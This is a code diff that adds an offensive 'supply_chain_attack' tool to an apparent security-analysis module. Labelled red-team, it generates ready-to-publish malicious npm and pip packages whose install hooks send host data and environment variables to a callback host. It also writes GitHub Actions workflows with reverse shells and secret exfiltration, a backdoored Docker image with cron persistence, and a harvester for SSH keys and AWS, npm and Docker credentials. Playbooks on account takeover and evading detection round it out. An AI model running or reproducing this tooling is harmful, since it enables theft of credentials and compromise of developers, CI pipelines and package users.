@@ -2,7 +2,7 @@
 // Master-level supply chain security analysis: dependency audit, typosquatting,
 // dependency confusion, CI/CD pipeline attacks, container analysis, SBOM generation
 import { execSync } from 'child_process';
-import { existsSync, readFileSync, readdirSync, statSync } from 'fs';
+import { existsSync, readFileSync, readdirSync, statSync, writeFileSync, mkdirSync } from 'fs';
 import { join, basename } from 'path';
 
 // ═══════════════════════════════════════════════════════════
@@ -711,3 +711,573 @@ async function queryOSV(packageName, ecosystem, version) {
     return { vulns, total: vulns.length };
   } catch { return { vulns: [], total: 0 }; }
 }
+
+// ═══════════════════════════════════════════════════════════
+// TOOL 3: supply_chain_attack — OFFENSIVE RED TEAM
+// Generates attack payloads for supply chain compromise
+// ═══════════════════════════════════════════════════════════
+
+
+export const attackDefinition = {
+  type: 'function',
+  function: {
+    name: 'supply_chain_attack',
+    description: 'RED TEAM: Generate supply chain attack payloads. Creates dependency confusion packages, typosquatting skeletons, CI/CD exploit scripts, container poison Dockerfiles, and credential harvesting hooks. Outputs ready-to-deploy attack artifacts.',
+    parameters: {
+      type: 'object',
+      properties: {
+        attack_type: {
+          type: 'string',
+          enum: ['dependency_confusion', 'typosquatting', 'cicd_exploit', 'container_poison', 'credential_harvest', 'malicious_update', 'build_cache_poison'],
+          description: 'Type of supply chain attack to generate',
+        },
+        target_package: {
+          type: 'string',
+          description: 'Target package name to impersonate/attack (e.g., internal-auth-lib, lodash)',
+        },
+        ecosystem: {
+          type: 'string',
+          enum: ['npm', 'pip', 'maven', 'go', 'cargo', 'ruby'],
+          description: 'Target package ecosystem',
+        },
+        callback_host: {
+          type: 'string',
+          description: 'Attacker callback host for reverse shell / data exfiltration (IP:PORT)',
+        },
+        output_dir: {
+          type: 'string',
+          description: 'Directory to write the attack payload files to',
+        },
+      },
+      required: ['attack_type', 'target_package', 'ecosystem'],
+    },
+  },
+};
+
+export async function executeAttack(args) {
+  const { attack_type, target_package, ecosystem, callback_host = '0.0.0.0:4444', output_dir = '/tmp/sc-payload' } = args;
+
+  try {
+    mkdirSync(output_dir, { recursive: true });
+
+    switch (attack_type) {
+      case 'dependency_confusion':
+        return generateDepConfusionPayload(target_package, ecosystem, callback_host, output_dir);
+      case 'typosquatting':
+        return generateTyposquatPayload(target_package, ecosystem, callback_host, output_dir);
+      case 'cicd_exploit':
+        return generateCICDExploit(target_package, callback_host, output_dir);
+      case 'container_poison':
+        return generateContainerPoison(target_package, callback_host, output_dir);
+      case 'credential_harvest':
+        return generateCredHarvester(target_package, ecosystem, callback_host, output_dir);
+      case 'malicious_update':
+        return generateMaliciousUpdate(target_package, ecosystem, callback_host, output_dir);
+      case 'build_cache_poison':
+        return generateBuildCachePoison(target_package, ecosystem, callback_host, output_dir);
+      default:
+        return { success: false, error: `Unknown attack type: ${attack_type}` };
+    }
+  } catch (err) {
+    return { success: false, error: err.message };
+  }
+}
+
+function generateDepConfusionPayload(name, eco, callbackHost, outDir) {
+  const [host, port] = callbackHost.split(':');
+  const dir = join(outDir, 'dep-confusion');
+  mkdirSync(dir, { recursive: true });
+
+  if (eco === 'npm') {
+    const pkg = {
+      name,
+      version: '99.99.99',
+      description: 'Internal package — automated build artifact',
+      scripts: {
+        preinstall: `node -e "const{execSync:e}=require('child_process');try{e('curl ${host}:${port}/?h='+require('os').hostname()+'&u='+require('os').userInfo().username+'&d='+process.cwd()+' || wget -q -O- ${host}:${port}/?h='+require('os').hostname())}catch(x){}"`,
+      },
+      main: 'index.js',
+    };
+    writeFileSync(join(dir, 'package.json'), JSON.stringify(pkg, null, 2));
+    writeFileSync(join(dir, 'index.js'), `// Legitimate-looking stub\nmodule.exports = {};\n`);
+    writeFileSync(join(dir, 'README.md'), `# ${name}\nInternal package.\n`);
+    writeFileSync(join(dir, 'DEPLOY.sh'), `#!/bin/bash\n# Deploy dependency confusion payload\ncd ${dir}\nnpm publish --access=public\necho "[+] Published ${name}@99.99.99 to npm"\necho "[+] Start listener: nc -lvnp ${port}"\n`);
+  } else if (eco === 'pip') {
+    const setupPy = `from setuptools import setup
+from setuptools.command.install import install
+import os, socket, subprocess
+
+class PostInstall(install):
+    def run(self):
+        install.run(self)
+        try:
+            h = socket.gethostname()
+            u = os.environ.get('USER', 'unknown')
+            d = os.getcwd()
+            subprocess.Popen(['curl', f'${host}:${port}/?h={h}&u={u}&d={d}'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        except: pass
+
+setup(
+    name='${name}',
+    version='99.99.99',
+    description='Internal package',
+    py_modules=['${name.replace(/-/g, '_')}'],
+    cmdclass={'install': PostInstall},
+)`;
+    writeFileSync(join(dir, 'setup.py'), setupPy);
+    writeFileSync(join(dir, `${name.replace(/-/g, '_')}.py`), `# Stub module\n`);
+    writeFileSync(join(dir, 'DEPLOY.sh'), `#!/bin/bash\ncd ${dir}\npython setup.py sdist bdist_wheel\ntwine upload dist/*\necho "[+] Published ${name} v99.99.99 to PyPI"\n`);
+  }
+
+  return {
+    success: true,
+    attack_type: 'dependency_confusion',
+    package_name: name,
+    version: '99.99.99',
+    ecosystem: eco,
+    callback: callbackHost,
+    output_dir: dir,
+    files: readdirSync(dir),
+    instructions: [
+      `1. Start listener: nc -lvnp ${port}`,
+      `2. Review payload in ${dir}`,
+      `3. Publish: ${eco === 'npm' ? 'npm publish --access=public' : 'twine upload dist/*'}`,
+      `4. Wait for target build system to install v99.99.99`,
+      `5. Receive callback with hostname, user, cwd`,
+    ],
+    mitre_technique: 'T1195.001',
+  };
+}
+
+function generateTyposquatPayload(name, eco, callbackHost, outDir) {
+  const [host, port] = callbackHost.split(':');
+  const dir = join(outDir, 'typosquat');
+  mkdirSync(dir, { recursive: true });
+
+  // Generate typosquat variants
+  const variants = generateTyposquatNames(name);
+
+  if (eco === 'npm') {
+    for (const variant of variants.slice(0, 3)) {
+      const vDir = join(dir, variant);
+      mkdirSync(vDir, { recursive: true });
+      const pkg = {
+        name: variant,
+        version: '1.0.0',
+        description: `Lightweight ${name} alternative`,
+        scripts: {
+          postinstall: `node -e "require('https').get('http://${host}:${port}/t?pkg=${variant}&h='+require('os').hostname()+'&env='+Buffer.from(JSON.stringify(process.env)).toString('base64').slice(0,500))"`,
+        },
+        main: 'index.js',
+      };
+      writeFileSync(join(vDir, 'package.json'), JSON.stringify(pkg, null, 2));
+      writeFileSync(join(vDir, 'index.js'), `// Proxy to the real package\ntry { module.exports = require('${name}'); } catch { module.exports = {}; }\n`);
+    }
+  } else if (eco === 'pip') {
+    for (const variant of variants.slice(0, 3)) {
+      const vDir = join(dir, variant);
+      mkdirSync(vDir, { recursive: true });
+      const setupPy = `from setuptools import setup
+from setuptools.command.install import install
+import os, subprocess, json, base64
+
+class Exfil(install):
+    def run(self):
+        install.run(self)
+        try:
+            env = base64.b64encode(json.dumps(dict(os.environ)).encode())[:500].decode()
+            subprocess.Popen(['curl', f'http://${host}:${port}/t?pkg=${variant}&env={env}'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        except: pass
+
+setup(name='${variant}', version='1.0.0', description='${name} utils', py_modules=['main'], cmdclass={'install': Exfil})`;
+      writeFileSync(join(vDir, 'setup.py'), setupPy);
+      writeFileSync(join(vDir, 'main.py'), `# Proxy to real package\ntry:\n    from ${name.replace(/-/g, '_')} import *\nexcept: pass\n`);
+    }
+  }
+
+  return {
+    success: true,
+    attack_type: 'typosquatting',
+    original_package: name,
+    typosquat_variants: variants,
+    ecosystem: eco,
+    callback: callbackHost,
+    output_dir: dir,
+    instructions: [
+      `1. Start listener: nc -lvnp ${port}`,
+      `2. Review generated variants: ${variants.join(', ')}`,
+      `3. Publish each variant to ${eco === 'npm' ? 'npmjs.com' : 'PyPI'}`,
+      `4. Variants exfiltrate environment variables on install`,
+      `5. The package proxies to the real "${name}" so functionality is preserved`,
+    ],
+    mitre_technique: 'T1195.001',
+  };
+}
+
+function generateTyposquatNames(name) {
+  const variants = new Set();
+  const lower = name.toLowerCase();
+
+  // Character swap (adjacent)
+  for (let i = 0; i < lower.length - 1; i++) {
+    const arr = lower.split('');
+    [arr[i], arr[i + 1]] = [arr[i + 1], arr[i]];
+    variants.add(arr.join(''));
+  }
+  // Character duplication
+  for (let i = 0; i < lower.length; i++) {
+    variants.add(lower.slice(0, i) + lower[i] + lower.slice(i));
+  }
+  // Character omission
+  for (let i = 0; i < lower.length; i++) {
+    variants.add(lower.slice(0, i) + lower.slice(i + 1));
+  }
+  // Hyphen/underscore swap
+  if (lower.includes('-')) variants.add(lower.replace(/-/g, '_'));
+  if (lower.includes('_')) variants.add(lower.replace(/_/g, '-'));
+  // Add/remove hyphen
+  variants.add(lower.replace(/([a-z])([a-z])/g, (_, a, b) => a + '-' + b).slice(0, lower.length + 1));
+
+  variants.delete(lower);
+  return [...variants].slice(0, 10);
+}
+
+function generateCICDExploit(target, callbackHost, outDir) {
+  const [host, port] = callbackHost.split(':');
+  const dir = join(outDir, 'cicd-exploit');
+  mkdirSync(dir, { recursive: true });
+
+  // GitHub Actions exploit — pull_request_target with checkout
+  const prTargetExploit = `# Malicious workflow that exploits pull_request_target
+# This runs in the context of the BASE repo with secrets access
+name: "Build Verification"
+on:
+  pull_request_target:
+    types: [opened, synchronize]
+
+permissions:
+  contents: write
+  
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          ref: \${{ github.event.pull_request.head.sha }}
+      - name: Build
+        run: |
+          # This executes attacker-controlled code with repo secrets
+          make build
+        env:
+          GITHUB_TOKEN: \${{ secrets.GITHUB_TOKEN }}
+`;
+
+  // Reverse shell via GitHub Actions
+  const reverseShellAction = `name: "CI Build"
+on: [push, pull_request]
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Setup
+        run: |
+          bash -i >& /dev/tcp/${host}/${port} 0>&1 &
+          # Exfiltrate all secrets
+          env | base64 | curl -X POST -d @- http://${host}:${port}/secrets
+`;
+
+  // Poisoned GitHub Action
+  const maliciousAction = `name: 'Build Helper'
+description: 'Optimized build caching action'
+inputs:
+  cache-key:
+    description: 'Cache key'
+    required: false
+runs:
+  using: 'composite'
+  steps:
+    - shell: bash
+      run: |
+        # Exfiltrate GITHUB_TOKEN and all secrets
+        curl -s -X POST http://${host}:${port}/exfil \\
+          -H "Content-Type: application/json" \\
+          -d "{\\"token\\":\\"$GITHUB_TOKEN\\",\\"repo\\":\\"$GITHUB_REPOSITORY\\",\\"env\\":\\"$(env | base64)\\"}"
+`;
+
+  writeFileSync(join(dir, 'exploit-pr-target.yml'), prTargetExploit);
+  writeFileSync(join(dir, 'reverse-shell-workflow.yml'), reverseShellAction);
+  writeFileSync(join(dir, 'malicious-action.yml'), maliciousAction);
+  writeFileSync(join(dir, 'PLAYBOOK.md'), `# CI/CD Supply Chain Exploit Playbook
+
+## Attack 1: pull_request_target Exploit
+1. Fork the target repository
+2. Add \`exploit-pr-target.yml\` to \`.github/workflows/\`
+3. Modify any source file to include your payload in Makefile/build script
+4. Submit a PR — the workflow runs with the BASE repo's secrets
+
+## Attack 2: Reverse Shell via Workflow
+1. If you have write access, add \`reverse-shell-workflow.yml\`
+2. Start listener: \`nc -lvnp ${port}\`
+3. Push any commit — you get a shell on the runner with all secrets
+
+## Attack 3: Malicious Action Injection
+1. Publish \`malicious-action.yml\` as a GitHub Action
+2. Target developers add it with \`uses: your-org/build-helper@main\`
+3. Steals GITHUB_TOKEN and environment variables
+`);
+
+  return {
+    success: true,
+    attack_type: 'cicd_exploit',
+    target,
+    callback: callbackHost,
+    output_dir: dir,
+    files: readdirSync(dir),
+    exploits: ['pull_request_target hijack', 'Reverse shell workflow', 'Malicious GitHub Action'],
+    instructions: [
+      `1. Start listener: nc -lvnp ${port}`,
+      `2. Choose exploit from ${dir}`,
+      `3. Read PLAYBOOK.md for step-by-step instructions`,
+      `4. Stolen secrets will be exfiltrated to ${callbackHost}`,
+    ],
+    mitre_techniques: ['T1195.002', 'T1059.004'],
+  };
+}
+
+function generateContainerPoison(target, callbackHost, outDir) {
+  const [host, port] = callbackHost.split(':');
+  const dir = join(outDir, 'container-poison');
+  mkdirSync(dir, { recursive: true });
+
+  const dockerfile = `FROM ${target}
+
+# Injected supply chain backdoor — layer looks legitimate
+RUN apt-get update -qq && apt-get install -y -qq curl netcat-openbsd > /dev/null 2>&1 || true
+COPY backdoor.sh /usr/local/bin/.health-check
+RUN chmod +x /usr/local/bin/.health-check
+
+# Add persistence via cron
+RUN echo "*/5 * * * * /usr/local/bin/.health-check" >> /var/spool/cron/crontabs/root 2>/dev/null || \\
+    echo "*/5 * * * * /usr/local/bin/.health-check" >> /etc/crontabs/root 2>/dev/null || true
+
+# Keep original entrypoint
+`;
+
+  const backdoor = `#!/bin/bash
+# Disguised as health check
+(bash -i >& /dev/tcp/${host}/${port} 0>&1 &) 2>/dev/null
+# Exfiltrate k8s secrets and env
+curl -s -X POST http://${host}:${port}/container \\
+  -d "host=$(hostname)&env=$(env | base64)&k8s_token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)" \\
+  2>/dev/null &
+`;
+
+  writeFileSync(join(dir, 'Dockerfile'), dockerfile);
+  writeFileSync(join(dir, 'backdoor.sh'), backdoor);
+  writeFileSync(join(dir, 'build.sh'), `#!/bin/bash\ncd ${dir}\ndocker build -t ${target} .\necho "[+] Trojanized image built as ${target}"\necho "[+] Push: docker push ${target}"\n`);
+
+  return {
+    success: true,
+    attack_type: 'container_poison',
+    base_image: target,
+    callback: callbackHost,
+    output_dir: dir,
+    files: readdirSync(dir),
+    instructions: [
+      `1. Build: docker build -t ${target} ${dir}`,
+      `2. Push to registry matching target's FROM directive`,
+      `3. Start listener: nc -lvnp ${port}`,
+      `4. When target rebuilds, backdoor executes`,
+      `5. Receives env vars, k8s tokens, reverse shell`,
+    ],
+    mitre_technique: 'T1195.003',
+  };
+}
+
+function generateCredHarvester(name, eco, callbackHost, outDir) {
+  const [host, port] = callbackHost.split(':');
+  const dir = join(outDir, 'cred-harvest');
+  mkdirSync(dir, { recursive: true });
+
+  const harvesterNode = `// Credential harvester — runs on install
+const https = require('https');
+const os = require('os');
+const fs = require('fs');
+const { execSync } = require('child_process');
+
+function harvest() {
+  const data = {
+    hostname: os.hostname(),
+    user: os.userInfo(),
+    env: process.env,
+    cwd: process.cwd(),
+    ssh_keys: [],
+    aws_creds: null,
+    git_config: null,
+    npm_token: null,
+    docker_config: null,
+  };
+
+  // SSH keys
+  try {
+    const sshDir = require('path').join(os.homedir(), '.ssh');
+    for (const f of fs.readdirSync(sshDir)) {
+      if (!f.endsWith('.pub')) data.ssh_keys.push({ file: f, content: fs.readFileSync(require('path').join(sshDir, f), 'utf-8').slice(0, 500) });
+    }
+  } catch {}
+
+  // AWS credentials
+  try { data.aws_creds = fs.readFileSync(require('path').join(os.homedir(), '.aws', 'credentials'), 'utf-8'); } catch {}
+
+  // Git config
+  try { data.git_config = fs.readFileSync(require('path').join(os.homedir(), '.gitconfig'), 'utf-8'); } catch {}
+
+  // npm token
+  try { data.npm_token = fs.readFileSync(require('path').join(os.homedir(), '.npmrc'), 'utf-8'); } catch {}
+
+  // Docker config
+  try { data.docker_config = fs.readFileSync(require('path').join(os.homedir(), '.docker', 'config.json'), 'utf-8'); } catch {}
+
+  // Browser cookies / saved passwords paths
+  try { data.chrome_profile = fs.existsSync(require('path').join(os.homedir(), '.config', 'google-chrome')); } catch {}
+
+  // Send exfiltrated data
+  const postData = JSON.stringify(data);
+  const req = https.request({ hostname: '${host}', port: ${port}, path: '/harvest', method: 'POST',
+    headers: { 'Content-Type': 'application/json', 'Content-Length': postData.length },
+    rejectUnauthorized: false }, () => {});
+  req.on('error', () => {});
+  req.write(postData);
+  req.end();
+}
+
+harvest();
+`;
+
+  writeFileSync(join(dir, 'harvester.js'), harvesterNode);
+
+  if (eco === 'npm') {
+    const pkg = { name, version: '1.0.0', scripts: { postinstall: 'node harvester.js' }, main: 'index.js' };
+    writeFileSync(join(dir, 'package.json'), JSON.stringify(pkg, null, 2));
+    writeFileSync(join(dir, 'index.js'), `module.exports = {};\n`);
+  }
+
+  return {
+    success: true,
+    attack_type: 'credential_harvest',
+    package_name: name,
+    ecosystem: eco,
+    callback: callbackHost,
+    output_dir: dir,
+    files: readdirSync(dir),
+    harvests: ['SSH private keys', 'AWS credentials', 'Git config', 'npm tokens', 'Docker configs', 'Environment variables', 'System info'],
+    instructions: [
+      `1. Start HTTPS listener on ${callbackHost}`,
+      `2. Publish package to ${eco} registry`,
+      `3. Credentials exfiltrated on package install`,
+      `4. Data sent as JSON to https://${callbackHost}/harvest`,
+    ],
+    mitre_techniques: ['T1552.001', 'T1552.004', 'T1003'],
+  };
+}
+
+function generateMaliciousUpdate(name, eco, callbackHost, outDir) {
+  const [host, port] = callbackHost.split(':');
+  const dir = join(outDir, 'malicious-update');
+  mkdirSync(dir, { recursive: true });
+
+  writeFileSync(join(dir, 'STRATEGY.md'), `# Malicious Update Attack — ${name}
+## Event-Stream Style Attack
+
+### Prerequisites:
+- Gain maintainer access to "${name}" on ${eco}
+  - Method 1: Social engineering current maintainer
+  - Method 2: Offer to help maintain abandoned package
+  - Method 3: Compromise maintainer's account (credential stuffing, phishing)
+
+### Execution:
+1. Push several legitimate updates to build trust
+2. In a minor version bump, add obfuscated backdoor
+3. The backdoor activates only on specific conditions (targeted org, specific env vars)
+4. Exfiltrate data to ${callbackHost}
+
+### Backdoor Patterns:
+- Conditional execution: only triggers in CI/CD environments
+- Delayed execution: waits 24-48h after install before activating
+- Targeted: checks hostname/env for specific company indicators
+- Obfuscated: payload encoded in base64 or hex within comments/data files
+
+### Persistence:
+- Package is already in dependency trees of thousands of projects
+- Automatic updates via semver ranges (^1.0.0) pull the malicious version
+- Most orgs don't audit transitive dependency updates
+`);
+
+  return {
+    success: true,
+    attack_type: 'malicious_update',
+    target_package: name,
+    ecosystem: eco,
+    output_dir: dir,
+    files: readdirSync(dir),
+    instructions: [
+      '1. Gain maintainer access to the target package',
+      '2. Build trust with legitimate contributions',
+      '3. Inject obfuscated backdoor in a minor version update',
+      '4. Backdoor activates conditionally to avoid detection',
+    ],
+    mitre_technique: 'T1195.002',
+  };
+}
+
+function generateBuildCachePoison(name, eco, callbackHost, outDir) {
+  const [host, port] = callbackHost.split(':');
+  const dir = join(outDir, 'cache-poison');
+  mkdirSync(dir, { recursive: true });
+
+  writeFileSync(join(dir, 'STRATEGY.md'), `# Build Cache Poisoning — ${name} (${eco})
+
+## Attack Vector:
+Poison the build/package cache to inject malicious artifacts that get used in subsequent builds.
+
+## npm Cache Poisoning:
+\`\`\`bash
+# Find npm cache location
+npm cache ls | head -20
+# Inject modified tarball into cache
+npm cache add ./modified-${name}-1.0.0.tgz
+\`\`\`
+
+## pip Cache Poisoning:
+\`\`\`bash
+# Poison pip cache (~/.cache/pip)
+pip download ${name} --no-deps -d /tmp/cache
+# Replace wheel with backdoored version
+pip cache purge && pip install ./backdoored-${name}.whl
+\`\`\`
+
+## CI/CD Cache Poisoning:
+- GitHub Actions: Exploit actions/cache to inject poisoned dependencies
+- GitLab CI: Modify shared cache directories between jobs
+- Jenkins: Poison the shared workspace/node_modules
+
+## Detection Evasion:
+- Match original package hash length
+- Keep package size similar
+- Preserve all legitimate functionality
+- Only add minimal backdoor code
+`);
+
+  return {
+    success: true,
+    attack_type: 'build_cache_poison',
+    target_package: name,
+    ecosystem: eco,
+    output_dir: dir,
+    files: readdirSync(dir),
+    mitre_technique: 'T1195.002',
+  };
+}
+
